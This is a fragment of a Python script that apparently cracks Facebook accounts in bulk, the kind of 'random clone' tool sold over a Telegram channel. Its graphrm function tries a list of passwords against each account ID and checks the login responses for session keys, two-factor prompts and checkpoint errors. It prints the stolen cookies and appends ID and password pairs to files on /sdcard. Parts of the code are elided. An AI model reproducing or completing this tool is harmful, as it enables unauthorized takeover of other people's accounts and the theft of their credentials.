...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, BOSS FF KING0011 "')
def logo():
	os.system('clear');print(f"""\r\r\x1b[1;97m{W}

=====================================
      𝘿𝘼𝙏𝙀 𝟬𝟵 𝙁𝙍𝙄𝘿𝘼𝙔 𝙅𝘼𝙉 𝟮𝟬𝟮𝟲
      𝙍𝘼𝙉𝘿𝙊𝙈 𝘾𝙇𝙊𝙉𝙀
      𝘿𝘼𝙏𝘼 𝙒𝙄𝙁𝙄 𝙒𝙊𝙍𝙆𝙄𝙉𝙂
      𝟯𝟮 𝙑𝙏 𝟲𝟰 𝙑𝙏 𝙒𝙊𝙍𝙆𝙄𝙉𝙂
      𝙇𝙊𝙂𝙄𝙉𝙂 𝟭𝟬𝟬% 𝙉𝙊 𝙑𝙋𝙉 
      𝙋𝘼𝙄𝘿 𝘾𝙊𝙈𝙈𝘼𝙉𝘿
      𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝙊𝙒𝙉𝙀𝙍 @FF_KING0011
=====================================\x1b[1;97m""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}𝟬𝟵 𝙁𝙍𝙄𝘿𝘼𝙔 𝙅𝘼𝙉 𝟮𝟬𝟮𝟲{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			if 'y' in cokix:print(f'\r\r{R}[{G}𝙐𝙄𝘿🌺{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[LMX-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/ROOTJAHID-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[𝟬𝟵 𝙁𝙍𝙄𝘿𝘼𝙔 𝙅𝘼𝙉 𝟮𝟬𝟮𝟲 {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
